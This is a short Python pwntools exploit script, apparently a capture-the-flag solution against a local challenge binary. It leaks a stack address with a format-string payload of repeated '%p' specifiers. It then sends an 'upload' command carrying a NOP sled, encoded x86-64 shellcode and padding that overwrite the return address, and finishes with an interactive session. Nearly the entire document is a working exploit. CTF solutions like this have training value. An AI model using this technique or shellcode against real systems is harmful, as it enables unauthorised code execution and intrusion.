from pwn import *
import os

#Setting up the environment

context(terminal=['tmux', 'new-window'])

p = gdb.debug('../distfiles/files', 'b main')

context(os="linux", arch="amd64")

#Getting the heap address

payload = b"upload,%p.%p.%p.%p.%p.%p,AAAA"

p.recvuntil("command")
p.sendline(payload)
p.recvuntil("name:")
rip = p.recvuntil("\n").decode('utf-8').split(".")[5].split("\n")[0]
rip = bytes(reversed(bytes.fromhex(rip[2:])))

#Crafting the payload

nopsled = b"\x90"*20

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x30\xda\xf1"
shellcode += b"\x89\x18\x6f\x98\x9c\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x5a\xf3\xa9\x10\x72"
shellcode += b"\x6d\xc7\xf6\x31\x84\xfe\x8c\x50\xf8\xd0\x25"
shellcode += b"\x32\xda\xe0\xd5\x67\x6f\x98\x9d\x61\x92\x78"
shellcode += b"\x6f\x72\x7f\xc2\xf6\x1a\x82\xfe\x8c\x72\x6c"
shellcode += b"\xc6\xd4\xcf\x14\x9b\xa8\x40\x60\x9d\xe9\xc6"
shellcode += b"\xb0\xca\xd1\x81\x27\x23\xb3\x52\xb3\x9f\xa6"
shellcode += b"\x6b\x07\x98\xcf\x78\x53\x16\xdb\x4f\x27\x11"
shellcode += b"\x7a\x3f\xdf\xf1\x89\x18\x6f\x98\x9c"

junk = "\x41"*(1025-len(nopsled)-len(shellcode))
payload = bytes("upload,test,", 'utf-8') + nopsled + shellcode + bytes(junk, 'utf-8') + rip

#Buffer Overflow

p.recvuntil("command")
p.sendline(payload)
p.recvuntil(": test")
p.recvuntil("command")
p.sendline("download,test")
p.interactive()
